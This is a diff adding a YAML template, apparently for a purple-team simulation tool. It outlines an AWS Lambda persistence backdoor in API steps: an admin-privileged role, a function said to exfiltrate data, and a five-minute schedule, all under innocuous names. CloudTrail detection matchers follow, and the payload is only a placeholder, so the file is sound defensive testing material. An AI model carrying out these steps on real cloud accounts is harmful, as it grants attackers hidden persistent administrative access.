@@ -1,0 +1,154 @@
+id: purpleloop-lambda-backdoor-function
+
+info:
+  name: Lambda Backdoor Function — Serverless Persistence
+  author: PurpleLoop
+  severity: critical
+  description: |
+    Simulates an attacker deploying a Lambda function that acts as a persistent
+    backdoor — triggered by CloudWatch Events or API Gateway to execute arbitrary
+    commands.  The function assumes an execution role with broad permissions,
+    providing ongoing access even after initial credentials are rotated.
+  reference:
+    - https://attack.mitre.org/techniques/T1525/
+    - https://attack.mitre.org/techniques/T1059/
+  tags: aws,lambda,persistence,backdoor,serverless,cloudtrail
+  metadata:
+    mitre_attack:
+      tactic: "TA0003 - Persistence"
+      technique: "T1525 - Implant Internal Image"
+    purpleloop:
+      attack_chain: persistence
+      variant: lambda-backdoor
+      severity_score: 9.0
+
+attack:
+  type: aws-api
+  steps:
+    # Step 1 — Create the execution role for the Lambda
+    - action: iam:CreateRole
+      description: Create an IAM role for the backdoor Lambda with admin trust
+      parameters:
+        RoleName: "lambda-monitoring-role"
+        AssumeRolePolicyDocument: |
+          {
+            "Version": "2012-10-17",
+            "Statement": [{
+              "Effect": "Allow",
+              "Principal": {"Service": "lambda.amazonaws.com"},
+              "Action": "sts:AssumeRole"
+            }]
+          }
+      delay: "{{delay_seconds}}"
+      cloudtrail_event:
+        eventName: CreateRole
+        eventSource: iam.amazonaws.com
+        sourceIPAddress: "{{source_ip}}"
+        userAgent: "{{user_agent}}"
+        requestParameters:
+          roleName: "lambda-monitoring-role"
+
+    # Step 2 — Attach broad permissions to the role
+    - action: iam:AttachRolePolicy
+      description: Give the Lambda role admin-level permissions
+      parameters:
+        RoleName: "lambda-monitoring-role"
+        PolicyArn: "arn:aws:iam::aws:policy/AdministratorAccess"
+      delay: "{{delay_seconds}}"
+      cloudtrail_event:
+        eventName: AttachRolePolicy
+        eventSource: iam.amazonaws.com
+        sourceIPAddress: "{{source_ip}}"
+        userAgent: "{{user_agent}}"
+        requestParameters:
+          roleName: "lambda-monitoring-role"
+          policyArn: "arn:aws:iam::aws:policy/AdministratorAccess"
+
+    # Step 3 — Deploy the backdoor Lambda function
+    - action: lambda:CreateFunction
+      description: Deploy a Lambda function that exfiltrates data on trigger
+      parameters:
+        FunctionName: "cloudwatch-log-processor"
+        Runtime: python3.11
+        Role: "arn:aws:iam::{{target_account}}:role/lambda-monitoring-role"
+        Handler: index.handler
+        Code:
+          ZipFile: "backdoor_payload_base64_encoded"
+      delay: "{{delay_seconds}}"
+      cloudtrail_event:
+        eventName: CreateFunction20150331
+        eventSource: lambda.amazonaws.com
+        sourceIPAddress: "{{source_ip}}"
+        userAgent: "{{user_agent}}"
+        requestParameters:
+          functionName: "cloudwatch-log-processor"
+          runtime: python3.11
+          role: "arn:aws:iam::{{target_account}}:role/lambda-monitoring-role"
+
+    # Step 4 — Set up a CloudWatch Events trigger (runs every 5 minutes)
+    - action: events:PutRule
+      description: Create a scheduled trigger for the backdoor function
+      parameters:
+        Name: "log-processor-schedule"
+        ScheduleExpression: "rate(5 minutes)"
+        State: ENABLED
+      delay: "{{delay_seconds}}"
+      cloudtrail_event:
+        eventName: PutRule
+        eventSource: events.amazonaws.com
+        sourceIPAddress: "{{source_ip}}"
+        userAgent: "{{user_agent}}"
+        requestParameters:
+          name: "log-processor-schedule"
+          scheduleExpression: "rate(5 minutes)"
+
+    # Step 5 — Link the rule to the Lambda function
+    - action: events:PutTargets
+      description: Associate the Lambda function with the CloudWatch rule
+      parameters:
+        Rule: "log-processor-schedule"
+        Targets:
+          - Id: "backdoor-target"
+            Arn: "arn:aws:lambda:us-east-1:{{target_account}}:function:cloudwatch-log-processor"
+      delay: "{{delay_seconds}}"
+      cloudtrail_event:
+        eventName: PutTargets
+        eventSource: events.amazonaws.com
+        sourceIPAddress: "{{source_ip}}"
+        userAgent: "{{user_agent}}"
+        requestParameters:
+          rule: "log-processor-schedule"
+
+matchers:
+  - type: sequence
+    name: lambda-backdoor-deployed
+    events:
+      - eventName == "CreateRole"
+      - eventName == "AttachRolePolicy" && requestParameters.policyArn contains "AdministratorAccess"
+      - eventName == "CreateFunction20150331"
+      - eventName == "PutRule"
+    within: 300
+  - type: cloudtrail
+    name: admin-lambda-role
+    condition: and
+    fields:
+      - eventName == "AttachRolePolicy"
+      - requestParameters.roleName contains "lambda"
+      - requestParameters.policyArn contains "AdministratorAccess"
+
+extractors:
+  - type: json
+    name: backdoor-function-name
+    json:
+      - ".requestParameters.functionName"
+  - type: json
+    name: backdoor-role
+    json:
+      - ".requestParameters.roleName"
+
+variables:
+  delay_seconds: "3"
+  source_ip: "198.51.100.42"
+  user_agent: "aws-cli/2.15.0 Python/3.11.6 Linux/5.15.0"
+  session_name: "red-team-sim"
+  target_account: "123456789012"
